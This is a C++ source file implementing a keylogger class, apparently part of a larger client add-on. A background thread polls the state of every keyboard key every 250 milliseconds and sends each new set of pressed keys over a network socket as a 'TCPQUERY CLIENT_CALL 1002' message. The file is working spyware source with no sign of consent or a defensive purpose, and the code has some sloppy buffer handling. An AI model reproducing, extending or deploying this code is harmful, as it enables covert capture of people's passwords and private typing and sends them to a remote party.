#pragma once



#include "keylog.h"





addonKeylog *gKeylog;


extern addonSocket *gSocket;

extern std::queue<std::string> send_to;





addonKeylog::addonKeylog()
{
	addonDebug("Keylog constructor called");

	boost::mutex::scoped_lock lock(this->Mutex);
	this->threadActive = true;
	lock.unlock();

	boost::thread keylog(&addonKeylog::Thread);
}



addonKeylog::~addonKeylog()
{
	addonDebug("Keylog deconstructor called");

	boost::mutex::scoped_lock lock(this->Mutex);
	this->threadActive = false;
	lock.unlock();
}



void addonKeylog::Thread()
{
	addonDebug("Thread addonKeylog::Thread() successfuly started");

	char key[257];
	char old_key[257];
	char null_key[257];

	memset(null_key, '0', sizeof null_key);

	do
	{
		memset(key, '0', sizeof key);

		for(int i = 0; i != 256; i++)
		{
			if(GetAsyncKeyState(i) == -32767)
			{
				key[i] = '1';
			}
		}

		key[256] = NULL;

		if(!strcmp(key, null_key) || !strcmp(key, old_key))
		{
			boost::this_thread::sleep(boost::posix_time::milliseconds(250));

			continue;
		}

		strcpy_s(old_key, key);

		gSocket->Send(formatString() << "TCPQUERY CLIENT_CALL " << 1002 << " " << key);

		boost::this_thread::sleep(boost::posix_time::milliseconds(250));
	}
	while(gKeylog->threadActive);
}